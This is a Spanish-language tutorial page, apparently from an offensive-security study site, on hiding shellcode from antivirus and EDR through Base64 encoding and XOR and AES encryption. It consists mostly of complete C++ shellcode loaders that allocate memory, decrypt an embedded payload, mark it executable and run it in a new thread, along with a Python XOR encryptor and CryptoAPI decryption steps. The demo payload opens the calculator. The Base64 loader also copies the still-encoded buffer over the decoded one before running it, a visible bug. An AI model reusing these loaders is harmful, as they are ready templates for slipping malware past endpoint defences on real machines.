---
layout: default
---


# Obfuscación y encriptación de código

Para evitar que el malware o shellcode a inyectar sea detectado por diferentes tipos de herramientas, en muchas ocasiones la mejor de las opciones será la de obfuscar o encriptar el código:

## Obfuscacion o codificación
Una de las tácticas más utilizadas para obfuscar un malware será la de codificar le contenido del payload que se desea inyectar. Ademas de una taćtica se tratará de una técnica utilizada por los desarrolladores para almacenar en el código fuente varaibles con su contenido en raw por lo que no siempore que se encuentren varaibles en el código fuente codificadas se tratará de contenido malicioso.
En la sección .data del binario definido como una varaiable global, se incluirá un payload en Base64 con el shellcode a inyectar.
Esto la añade un paso adicional a la inyección de código básica explicada en secciones anteriores y es lade Decodificar el contenido de la variable en Base64, antes de almacenarlo en la memoria reservada para la ejecución:

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int payload_len = sizeof(calc_payload);

int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}

int main(void) {
    
	void * exec_mem;
	DWORD outLenb64;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("\nSotred payload in .data section %-20s : 0x%-016p\n", "payload addr", (void *)calc_payload);
	printf("\n [VirtualAlloc] of new moemory region %-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	outLenb64 = DecodeBase64((const BYTE *)calc_payload, payload_len, (char *) exec_mem, payload_len);
	printf("\n Decoded payload output length %d\n", (void *)outLenb64);
	printf("\n Decoded payload memory position Base64 0x%-016p\n", &outLenb64);
	getchar();
	printf(" [RtlMoveMemory] copy data \n");
	RtlMoveMemory(exec_mem, calc_payload, payload_len);
	printf(" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ \n");
	getchar();
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf(" [CreateThread] Exec stored payload \n");
	getchar();
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}


```
Salida de la ejecución del proceso:
```
Sotred payload in .data section payload addr         : 0x00007FF6F20CD000

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x0000017694DA0000

 Decoded payload output length 276

 Decoded payload memory position Base64 0x0000002AF52FF938

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload
```
 

## Encriptación
En el proceso de estudio de las medidas de evasión para realizar el bypass de un AV o un EDR, se realizarán dos tipos diferentes de encriptación simétrica. 

```c++
XOR
AES
```
Esto implica que para poder desencriptar el shellcode e inyectarlo en memoria en tiempo de ejecución será necesario que el código fuente contenga la clave de cifrado :


### Encriptación XOR de shellcode

El código funete asociado al cifrado con XOR, realizara un cifrado simétrico byte a byte realizando la siguiente operación:


|   A   |   B   | A XOR B |
|-------|-------|---------|
|   0   |   0   |    0    |
|   0   |   1   |    1    |
|   1   |   0   |    1    |
|   1   |   1   |    0    |


La función criptográfica codificada será la siguiente:

```c++
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;

    j = 0;                                  // se inicializa el bucle para empezar por byte 0
    for (int i = 0; i < data_len; i++) {    // se recorre uno a uno todos los bytes del buffer
        data[i] = data[i] ^ key[j];         // se aplica la operación de cifrado para cada byte ^
        j++;                                // se aumenta el contador de la clave de cifrado key
        if (j == key_len - 1) j = 0;        // Se valida si es el último byte de la clave para inicializar el contador j
    }
}
```
Código fuente en python2 para encriptar con algoritmo XOR:

```python
import sys

KEY = "y__modaba!!!"

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')



try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()


ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

```

Codigo fuente con el shellcode de la calculadora de windows:

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char calc_payload[] = { 0x85, 0x17, 0xdc, 0x89, 0x9f, 0x8c, 0xa1, 0x62, 0x61, 0x21, 0x60, 0x70, 0x38, 0xf, 0xd, 0x3c, 0x39, 0x2c, 0x50, 0xb0, 0x4, 0x69, 0xaa, 0x73, 0x19, 0x17, 0xd4, 0x3f, 0x77, 0x2c, 0xea, 0x30, 0x41, 0x69, 0xaa, 0x53, 0x29, 0x17, 0x50, 0xda, 0x25, 0x2e, 0x2c, 0x53, 0xa8, 0x69, 0x10, 0xe1, 0xd5, 0x63, 0x3e, 0x11, 0x6d, 0x48, 0x41, 0x23, 0xa0, 0xe8, 0x2c, 0x60, 0x78, 0x9e, 0xbd, 0x80, 0x3d, 0x25, 0x30, 0x2a, 0xea, 0x73, 0x1, 0xaa, 0x3b, 0x63, 0x17, 0x6c, 0xbf, 0xef, 0xe1, 0xea, 0x61, 0x21, 0x21, 0x69, 0xfc, 0x9f, 0x2b, 0xa, 0x27, 0x65, 0xb1, 0x32, 0xea, 0x69, 0x39, 0x65, 0xf2, 0x1f, 0x7f, 0x24, 0x6e, 0xb4, 0x82, 0x34, 0x29, 0xde, 0xe8, 0x60, 0xf2, 0x6b, 0xd7, 0x25, 0x6e, 0xb2, 0x2c, 0x53, 0xa8, 0x69, 0x10, 0xe1, 0xd5, 0x1e, 0x9e, 0xa4, 0x62, 0x25, 0x60, 0xa3, 0x59, 0xc1, 0x54, 0xd0, 0x35, 0x5c, 0x13, 0x49, 0x67, 0x21, 0x58, 0xb3, 0x14, 0xf9, 0x79, 0x65, 0xf2, 0x1f, 0x7b, 0x24, 0x6e, 0xb4, 0x7, 0x23, 0xea, 0x2d, 0x69, 0x65, 0xf2, 0x1f, 0x43, 0x24, 0x6e, 0xb4, 0x20, 0xe9, 0x65, 0xa9, 0x69, 0x20, 0xa9, 0x1e, 0x7, 0x2c, 0x37, 0x3a, 0x38, 0x38, 0x20, 0x79, 0x60, 0x78, 0x38, 0x5, 0x17, 0xee, 0x83, 0x44, 0x20, 0x30, 0x9e, 0xc1, 0x79, 0x60, 0x20, 0x5, 0x17, 0xe6, 0x7d, 0x8d, 0x36, 0x9d, 0x9e, 0xde, 0x7c, 0x69, 0xc3, 0x5e, 0x5f, 0x6d, 0x6f, 0x64, 0x61, 0x62, 0x61, 0x69, 0xac, 0xac, 0x78, 0x5e, 0x5f, 0x6d, 0x2e, 0xde, 0x50, 0xe9, 0xe, 0xa6, 0xde, 0xf4, 0xc2, 0xaf, 0xea, 0xcf, 0x39, 0x25, 0xdb, 0xc4, 0xf4, 0x9c, 0xbc, 0xde, 0xac, 0x17, 0xdc, 0xa9, 0x47, 0x58, 0x67, 0x1e, 0x6b, 0xa1, 0xda, 0xc1, 0xc, 0x5a, 0xe4, 0x2a, 0x7c, 0x16, 0xe, 0x8, 0x61, 0x78, 0x60, 0xa8, 0xa3, 0xa0, 0x8a, 0xe, 0xe, 0x8, 0x2, 0x4c, 0x4, 0x59, 0x44, 0x21 };
	unsigned int payload_len = sizeof(calc_payload);
	char key[] = "y__modaba!!!";
	
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("\nSotred payload in .data section %-20s : 0x%-016p\n", "payload addr", (void *)calc_payload);
	printf("\n [VirtualAlloc] of new moemory region %-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	XOR((char *) calc_payload, payload_len, key, sizeof(key));
	printf("\n Decripted payload XOR %d\n", (void *)calc_payload);
	printf("\n Decripted pyaload XOR 0x%-016p\n", &calc_payload);
	getchar();
	printf(" [RtlMoveMemory] copy data \n");
	RtlMoveMemory(exec_mem, calc_payload, payload_len);
	printf(" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ \n");
	getchar();
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf(" [CreateThread] Exec stored payload \n");
	getchar();
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

Salida de la ejecución:

```
Sotred payload in .data section payload addr         : 0x000000C46C6FF830

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x000002A2576A0000

 Decripted payload XOR 1819277360

 Decripted pyaload XOR 0x000000C46C6FF830

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload
```

![xor_encryption](/assets/images/xor_encryption.png)

### Encriptación AES de shellcode

Para las operaciones criptográficas con la clave simétrica de AES, se utilizará la nueva API de Windows Cryptography API: Next Generation.
A continuación se define el pseudo-código asociado a la desencriptación de un payload mediant una clave dada:

```c++
// 1. open a handle hProv to a Cryptographic Service Provider - a module
// implementing specific crypto algorithms, like RSA, AES, etc.
CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)

// 2. prepare a new hashing object to generate a SHA-256 hash from the provided key
CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)

// 3. create SHA-256 hash from the key
CryptHashData(hHash, key, keylen, 0)

// 4. derive a symmetric AES-256 key from the hash
CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)

// 5. finally, decrypt the payload
CryptDecrypt(hKey, NULL, 0, 0, payload, &payload_len)
```

Explicación de cada una de las funciones y parámetros:

#### CryptAcquireContextW()

```c++
BOOL WINAPI CryptAcquireContextW(
  HCRYPTPROV *phProv,        // pointer to a handle of a CSP [out param]
  LPCWSTR    pszContainer,   // key container name (null-terminated string). When dwFlags is set to CRYPT_VERIFYCONTEXT, pszContainer must be set to NULL
  LPCWSTR    pszProvider,    // null-terminated string that contains the name of the CSP to be used. If NULL == default provider
  DWORD      dwProvType,    // type of provider to acquire, ex. PROV_RSA_FULL, PROV_RSA_AES, PROV_DSS_DH, etc.
  DWORD      dwFlags        // flag values, usually set to zero. CRYPT_VERIFYCONTEXT for ephemeral keys
);
```

#### CryptCreateHash()

```c++
BOOL WINAPI CryptCreateHash(
  HCRYPTPROV hProv,    // handle to a CSP created by a call to CryptAcquireContext()
  ALG_ID     Algid,    // identifies the hash algorithm to use, ex. CALG_3DES, CALG_AES_128, CALG_ECDH, etc.
  HCRYPTKEY  hKey,     // type of hash algorithm is a keyed hash (like MAC or HMAC). Zero if nonkeyed algos
  DWORD      dwFlags,  // 0 or CRYPT_SECRETDIGEST (not used)
  HCRYPTHASH *phHash   // address to which the function copies a handle to the new hash object
);
```

#### CryptHashData()

```c++
BOOL CryptHashData(
  HCRYPTHASH hHash,      // handle of the hash object
  const BYTE *pbData,    // pointer to a buffer that contains the data to be added to the hash object
  DWORD      dwDataLen,  // number of bytes of data to be added
  DWORD      dwFlags     // 0 - nothing, 0x1 - CRYPT_USERDATA
);
```

#### CryptDeriveKey()

```c++
BOOL CryptDeriveKey(
  HCRYPTPROV hProv,      // handle of a CSP created by a call to CryptAcquireContext()
  ALG_ID     Algid,      // identifies the hash algorithm to use, ex. CALG_3DES, CALG_AES_128, CALG_ECDH, etc. 
  HCRYPTHASH hBaseData,  // handle to a hash object that has been fed the exact base data
  DWORD      dwFlags,    // type of key generated, can be zero or one or more values, ex. CRYPT_CREATE_SALT, CRYPT_EXPORTABLE, CRYPT_UPDATE_KEY, etc.
  HCRYPTKEY  *phKey      // pointer to a variable to receive the address of the handle of the newly generated key
);
```
#### CryptDecrypt()

```c++
BOOL CryptDecrypt(
  HCRYPTKEY hKey,        // handle to the key to use for the decryption
  HCRYPTHASH hHash,      // handle to a hash object. If no hash, must be zero
  BOOL      Final,       // specifies whether this is the last section in a series being decrypted. If TRUE - the last block.
  DWORD     dwFlags,     // possible values: CRYPT_OAEP or CRYPT_DECRYPT_RSA_NO_PADDING_CHECK
  BYTE      *pbData,     // pointer to a buffer that contains the data to be decrypted. After the decryption, the plaintext is placed back into this same buffer.
  DWORD     *pdwDataLen  // length of the pbData buffer
);
```